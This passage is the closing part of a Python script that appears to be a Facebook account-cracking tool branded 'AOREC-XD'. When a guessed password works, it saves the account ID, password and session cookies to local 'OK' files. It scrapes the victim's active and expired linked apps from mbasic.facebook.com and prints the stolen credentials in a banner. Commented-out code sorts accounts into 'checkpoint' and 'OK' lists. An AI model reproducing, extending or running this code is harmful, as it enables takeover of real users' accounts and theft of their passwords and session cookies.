				elif 'ya' in taplikasi:

					coki=po.cookies.get_dict()

					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])

					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')

					user=idf

					infoakun = ""

					session = requests.Session()

					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text

					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text

					infoakun += (f"\n[bold cyan][•] LIST ACTIVE APPLICATIONS :[/bold cyan] \n")

					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))

					nok=1

					for muncul in apkaktif:

						infoakun+= (f"[bold cyan][{nok}] {muncul[0]} {muncul[1]}[/bold cyan]\n")

						nok+=1



					hit=0

					infoakun += (f"\n[bold yellow][•] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")

					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))

					hit=0

					for muncul in apkexp:

						hit+=1

						infoakun += (f"[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n")

					print('\n')

					statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'

					statusok1 = nel(statusok, style='green')

					cetak(nel(statusok1, title='[bold green]AOREC-XD OK[/bold green]'))

					ok+=1

					break





			else:

				continue

		except requests.exceptions.ConnectionError:

			time.sleep(31)

	loop+=1



#			if "checkpoint" in po.cookies.get_dict().keys():

#				print(f'\r{K}>> {idf}|{pw}{N}')     

#				os.popen('play-audio .cp.mp3')

#				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')

#				akun.append(idf+'|'+pw)

#				cp+=1

#				break

#			elif "c_user" in ses.cookies.get_dict().keys():

#				ok+=1

#				coki=po.cookies.get_dict()

#				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])

#				print(f'\r{H}>> {idf}|{pw}|{kuki}{N}')

#				os.popen('play-audio .ok.mp3')

#				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')

#				cek_apk(session,coki)

#				break

#				

#			else:

#				continue

#		except requests.exceptions.ConnectionError:

#			time.sleep(31)

#	loop+=1





#-----------------------[ SYSTEM-CONTROL ]--------------------#

if __name__=='__main__':

	try:os.system('git pull')

	except:pass

	try:os.mkdir('OK')

	except:pass

	try:os.mkdir('CP')

	except:pass

	try:os.system('touch .prox.txt')

	except:pass

	login()



#>>>>> THANKS TO THIS HERE <<<<<<<#

#>>>>> XATAR404 <<<<<#
